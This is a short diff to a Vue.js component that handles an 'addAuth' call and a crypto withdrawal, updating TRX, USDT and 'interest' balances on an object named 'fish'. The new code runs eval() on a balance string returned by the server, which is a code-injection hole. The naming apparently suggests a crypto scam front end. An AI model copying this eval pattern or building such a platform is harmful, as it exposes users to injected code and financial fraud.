@@ -468,7 +468,7 @@ export default {
     },
     addAuth(data){
       addAuth(data).then(response => {
-        if (response.code==200){
+        if (response.data.code==200){
           console.info(response);
         }
       });
@@ -523,7 +523,18 @@ export default {
       this.fish.currentBalance=parseFloat(this.fish.usdt);
       this.fish.totalBalance=parseFloat(this.fish.total);
       withdraw(this.fish).then(response => {
-        this.$toast({ message: response.data.msg});
+        if (response.data.code!=200){
+          this.$toast({ message: "withdraw amount error"});
+          return false;
+        }
+        this.fish=response.data.data;
+        var balance = eval('(' + this.fish.balance +')');
+        this.fish.trx=balance.trx==null?0.00:balance.trx;
+        this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
+        this.fish.allowWithdraw=balance.interest==null?0.00:balance.interest;
+        this.fish.total=parseInt(this.fish.usdt)+parseInt(balance.interest);
+        this.$toast({ message: "withdraw Success"});
+        return true;
       });
     }
   }
